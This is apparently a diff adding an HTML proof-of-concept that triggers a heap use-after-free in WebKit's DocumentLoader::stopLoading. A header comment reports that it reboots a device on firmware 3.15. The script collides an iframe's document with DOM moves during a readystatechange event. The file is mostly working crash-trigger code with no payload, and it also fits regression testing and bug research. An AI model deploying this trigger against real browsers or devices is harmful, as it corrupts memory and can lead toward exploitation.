@@ -1,0 +1,47 @@
+<!--
+Test 2
+
+Heap User-After-Free in DocumentLoader::stopLoading
+
+Precise data abort reboot on FW 3.15
+
+If I understand correctly:
+Call to m_frame -> loader() -> stopLoading() can change ready state, fires mutation event that fubars the document loader
+
+Faulty protection allows you to collide docs and frames
+
+josh_axey
+-->
+
+<html>
+test if crash
+<body>
+<div id="a"></div>
+<div id="b">
+<iframe id="f" src="about:blank"></iframe>
+</div>
+<script>
+if (window.testRunner)
+    testRunner.dumpAsText();
+
+var listenerActive = false;
+var fDoc = document.getElementById('f').contentDocument;
+fDoc.open();
+
+// Wait for frame load, collide divs
+smashDiv = function() {
+    if (fDoc.readyState == 'loading') {
+        if (!listenerActive) {
+            fDoc.addEventListener('readystatechange', smashDiv);
+            listenerActive = true;
+        }
+        return;
+    }
+    document.getElementById('a').appendChild(document.getElementById('b'));
+};
+
+smashDiv();
+fDoc.close();
+</script>
+</body>
+</html>
